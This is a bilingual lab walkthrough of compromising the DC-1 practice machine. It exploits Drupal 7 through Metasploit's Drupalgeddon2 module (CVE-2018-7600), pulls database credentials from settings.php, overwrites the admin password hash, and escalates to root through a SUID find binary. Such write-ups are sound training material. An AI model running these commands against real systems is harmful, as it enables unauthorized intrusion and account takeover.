---

# ✅ DC-1 渗透笔记增强版

---

## 🧭 信息收集 | Information Gathering

### 🔹 使用 nmap 获取端口与服务信息  
Run nmap to discover open ports and service versions:

```apl
nmap -sS -sV -T4 -Pn <target_ip>
```

发现 Web 服务运行 Drupal 7。通过访问首页与使用工具（如 WhatWeb、Dirsearch）确认 CMS 类型。
 Drupal 7 CMS detected via webpage banner and WhatWeb/Dirsearch scans.

------

## 🎯 漏洞利用 | Exploitation

### 🔹 使用 Metasploit 框架的 Drupal 7 RCE 模块（CVE-2018-7600）

```apl
msfconsole
search drupal 7
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOST <ip>
set TARGETURI /
run
```

该模块利用 Drupalgeddon2（CVE-2018-7600）远程代码执行漏洞实现反弹 Shell。

> This exploit takes advantage of Drupal 7's RCE vulnerability to gain remote access.

------

## 🧱 获取稳定 shell | Gaining a Stable Shell

```apl
python -c "import pty; pty.spawn('/bin/bash')"
```

通过 Python 获取伪终端，提升交互稳定性。
 Spawns a pseudo-terminal to improve shell usability.

------

## 🔐 查找敏感文件 | Locating Configuration Files

目标提示检查 Drupal 的配置文件，通常位于：

```apl
find / -name settings.php 2>/dev/null
```

文件包含数据库凭据，可尝试登录数据库。
 The file stores database credentials, useful for privilege escalation.

------

## 🛢️ 数据库访问 | Accessing the Database

```apl
mysql -u <username> -p
```

使用 `settings.php` 中的凭据成功连接数据库，查询 `users` 表获取管理员信息。
 Logged into MySQL using credentials and retrieved admin hash from `users` table.

------

## 🔁 替换 Drupal 管理员密码 | Replacing Drupal Admin Password

使用 Drupal 提供的脚本生成新密码的哈希：

```apl
cd scripts
php password-hash.sh 123456
```

使用以下语句替换用户密码：

```sql
UPDATE drupaldb.users SET pass='<new_hash>' WHERE name='admin';
```

登录后台验证是否成功更换密码。
 Replaced admin password and verified login via web interface.

------

## 🧩 查找提权点 | Privilege Escalation

使用以下命令查找具有 SUID 权限的程序：

```apl
find / -user root -perm -4000 -print 2>/dev/null
```

发现 `/usr/bin/find` 可被利用进行提权。
 Found a vulnerable `find` binary with SUID bit set.

------

## 🚀 使用 find 提权 | Privilege Escalation via `find`

```apl
touch exploit
find exploit -exec /bin/sh \;
whoami
```

提权成功，获得 root 权限。
 Successfully escalated privileges and gained root shell.

------

## 🏁 总结 | Summary

- 信息收集确认 Drupal 版本
- 利用 CVE-2018-7600 获取 shell
- 查找配置文件，进入数据库，替换 admin 密码
- 使用 SUID 程序提权获得 root

> A complete Drupal RCE + privilege escalation chain, ideal for beginner red teamers.

